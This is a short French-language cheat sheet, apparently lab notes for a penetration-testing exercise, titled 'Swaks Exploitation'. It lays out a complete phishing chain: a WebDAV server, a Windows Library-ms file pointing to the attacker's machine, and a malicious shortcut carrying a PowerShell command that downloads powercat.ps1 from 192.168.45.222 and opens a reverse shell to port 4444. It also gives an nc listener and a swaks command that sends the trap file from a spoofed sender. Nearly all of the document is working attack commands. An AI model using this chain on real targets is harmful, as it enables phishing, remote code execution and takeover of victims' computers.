# Swaks Exploitation

## 1. Hébergement WebDAV

```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav
```

## 2. Création d'un fichier de configuration Library-ms sur Windows

Créer un fichier `config.Library-ms` avec le contenu suivant :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<KALI_MACHINE></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

## 3. Création d'un raccourci malveillant sur Windows

Créer un raccourci `install.lnk` puis le transférer sur Kali via WebDAV :

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.222:8000/powercat.ps1'); powercat -c 192.168.45.222 -p 4444 -e powershell"
```

## 4. Démarrer un serveur Python sur Kali

```bash
python3 -m http.server 8000
```
(S'assurer que `powercat.ps1` est dans le répertoire du serveur.)

## 5. Écoute sur le port 4444

```bash
nc -lnvp 4444
```

## 6. Préparation du mail

Créer un fichier `body.txt` dans `/home/kali/beyond/` avec le contenu souhaité.

## 7. Envoi du mail piégé

```bash
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap